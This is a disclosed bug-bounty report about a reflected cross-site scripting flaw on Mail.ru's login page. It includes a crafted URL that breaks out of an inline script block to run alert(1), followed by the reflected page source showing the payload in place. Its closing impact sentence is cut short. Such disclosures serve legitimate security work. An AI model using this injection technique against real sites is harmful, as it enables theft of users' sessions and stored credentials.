@@ -1,0 +1,50 @@
+ReportLink:https://hackerone.com/reports/344112
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/shafigullin
+ReportedTo:Mail.ru(mailru)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:15.08.2018 16:26:43
+
+Summary:
+Reflected XSS on https://account.mail.ru/login
+Domain, site, application
+--
+account.mail.ru
+
+Testing environment
+--
+Chrome
+
+Steps to reproduce
+--
+
+Login and open
+
+```
+https://account.mail.ru/login?email=test@mail.ru&fail=1&page=https%3A%2F%2Fe.mail.ru%2Fcgi-bin%2Freadmsg%3Fid%3D15248558440000000928%26from%3Dmail.login%26rb_test_id%3D424%26back%3D1%26from%3Dlogin%26rb_test_id%3D424%26back%3D1%3C/script/%3E%3Cscript%3E`%3C/script%3E`;alert(1)//
+```
+
+Actual results
+--
+alert(1)
+
+Expected results, security impact description and recommendations
+--
+XSS
+
+PoC, exploit code, screenshots, video, references, additional resources
+--
+
+{F291117}
+
+```html
+ <script type="text/html" id="state">
+            {"password":"","dirtyFields":["Username","Password","captcha"],"provider":0,"domain":"mail.ru","login":"test@mail.ru","domains":[{"name":"mail.ru","external":false},{"name":"inbox.ru","external":false},{"name":"bk.ru","external":false},{"name":"list.ru","external":false},{"name":"yandex.ru","external":true},{"name":"gmail.com","external":true},{"name":"yahoo.com","external":true}],"config":{"version":"2kit","rbTestId":"424","restore":"phone","paths":{"js":"//img.imgsmail.ru/login/{build}/{lang}/app.js","css":"//img.imgsmail.ru/login/{build}/css/","images":"//img.imgsmail.ru/login/{build}/images/","authGate":"//img.imgsmail.ru/ag/0.3.13/authGate.js"},"urls":{"fest":"/cache/templates/","authOrigin":"https://auth.mail.ru","passremindUrl":"https://e.mail.ru/password/restore/","signupUrl":"https://e.mail.ru/signup","portalOrigin":"https://portal.mail.ru","captchaUrl":"https://c.mail.ru/c/1","page":"https://e.mail.ru/messages/inbox","pageMobile":"https://touch.mail.ru/","xRayRadarUrl":"//xray.imgsmail.ru","statdRadarUrl":"//stat.radar.imgsmail.ru"},"portal":{"logo":{"name":"href","href":"https://mail.ru","target":"_self","img":"//img.imgsmail.ru/login/{build}/images/logo2x.png"},"mode":["responsive"]},"counters":{"login":{"default":{"render":16784017,"back":16784074,"captcha":16784019,"passremind":1507549,"signup":1507557,"error":1507575,"signin":{"saveauth":1507536,"nosaveauth":1509556},"restore":{"open":22145342,"not-opened":16784017,"send":22145383,"sms":27769459,"push":27769436,"email":27769462,"problems":27769475},"close":{"button":1507562,"escape":1507565},"email-providers":{"yandexru":1661519,"ramblerru":1661520,"gmailcom":1661522,"other":1661524,"yahoocom":22710137},"social":{"ok":16784045,"vk":16784042,"fb":16784046,"error":16784047}},"splash":{"render":1507569,"back":29285568,"captcha":29285570,"passremind":1507548,"signup":1507550,"error":1507574,"signin":{"saveauth":1507533,"nosaveauth":29285572},"restore":{"open":29285574,"not-opened":29285575,"send":29285577,"sms":29285578,"push":29285580,"email":29285581,"problems":29285584},"close":{"button":29285585,"escape":29285587},"email-providers":{"yandexru":29285590,"ramblerru":29285592,"gmailcom":29285594,"other":29285596,"yahoocom":29285598},"social":{"ok":29285600,"vk":29285601,"fb":29285603,"error":29285604}},"oneclick":{"render":29285644,"back":29285645,"captcha":29285646,"passremind":29285648,"signup":29285690,"error":29285650,"signin":{"saveauth":29285677,"nosaveauth":29285686},"restore":{"open":29285691,"not-opened":29285694,"send":29285695,"sms":29285697,"push":29285701,"email":29285702,"problems":29285707},"close":{"button":29285711,"escape":29285711},"email-providers":{"yandexru":29285895,"ramblerru":29285896,"gmailcom":29285897,"other":29285898,"yahoocom":29285899},"social":{"ok":29285904,"vk":29285915,"fb":29285917,"error":29285919}},"mail.login":{"render":29285940,"back":29285941,"captcha":29285951,"passremind":29285955,"signup":29285975,"error":29285977,"signin":{"saveauth":29285978,"nosaveauth":29285979},"restore":{"open":29285981,"not-opened":29288426,"send":29285984,"sms":29285985,"push":29285987,"email":29286003,"problems":29286005},"close":{"button":29286006,"escape":29286007},"email-providers":{"yandexru":29286009,"ramblerru":29286013,"gmailcom":29286015,"other":29286016,"yahoocom":29286017},"social":{"ok":29286020,"vk":29286021,"fb":29286023,"error":29286025}}},"choice":{"default":{"render":20911619,"enter-other-mail":20911825,"switch-user":20911825,"email-render":20912417,"email-signin":20912075,"email-switch-user":20912015,"email-enter-other-mail":20911996,"ag-relogin-error":20912534,"email-ag-relogin-error":22335185}}},"ActiveLogin":"","HasAuth":true,"platform":{"os":"","osver":""},"device":{"dtid":"","wtrid":""},"xray":{"VIDCookie":"","split":"","ActiveEmail":"","utm":{"source":"","medium":"","campaign":"","term":"","content":""},"project":"login","XRAY_RADAR_URL":"//xray.imgsmail.ru","RadarPrefix":"","MAX_BATCH_SIZE":60000,"MAX_CHUNK_SIZE":4000},"supportedDevices":{"Android":"4","iPhone OS":"8","Windows Phone":"8"},"xrayEnable":false},"restore":{"id":null,"phones":[],"support_disabled":false},"captcha":"","search":{"email":"test@mail.ru","fail":"1","page":"https://e.mail.ru/cgi-bin/readmsg?id=15248558440000000928&from=mail.login&rb_test_id=424&back=1&from=login&rb_test_id=424&back=1</script/><script>`&lt;/script&gt;`;alert(1)//"},"isAuthorized":false,"csrf":"c262b186c0d64f0387baf394410364ee","errorMessages":{"Username":null,"Password":null,"captcha":null}}
+        </script>
+```
+
+## Impact
+
+attacker can steal stored by browser
